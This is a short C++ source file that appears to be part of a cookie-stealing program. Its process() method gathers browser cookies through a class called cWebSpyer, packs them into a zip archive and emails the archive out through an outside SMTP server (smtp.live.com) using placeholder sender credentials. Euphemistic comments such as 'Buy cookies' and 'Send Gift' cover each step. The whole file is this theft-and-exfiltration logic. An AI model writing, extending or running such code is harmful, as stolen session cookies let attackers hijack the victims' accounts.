#include "cMidprocessing.h"
#include "cWebSpyer.h"
#include "cPackageCreator.h"
#include "cEmailSender.h"
#include "sConstants.h"

cMidprocessing::cMidprocessing()
{
}


cMidprocessing::~cMidprocessing()
{
}

void cMidprocessing::process()
{
	//Buy cookies
	cWebSpyer webSpyer;
	vector<string> vtstrBiscuits;
	webSpyer.getCookies(vtstrBiscuits);

	//Gift wrapper
	cPackageCreator packageCreator;
	packageCreator.packageCookies(vtstrBiscuits);

	//Send Gift
	cEmailSender emailSender("smtp.live.com", 587,
		"email@domain.com",
		"emailPassword",
		"recipient@domain.com");

	vector<string> vtstrAttachment;
	vtstrAttachment.push_back(sConstants::getZipCookiesPath());
	emailSender.setAttachmentPath(vtstrAttachment);
	emailSender.sendMail();
}
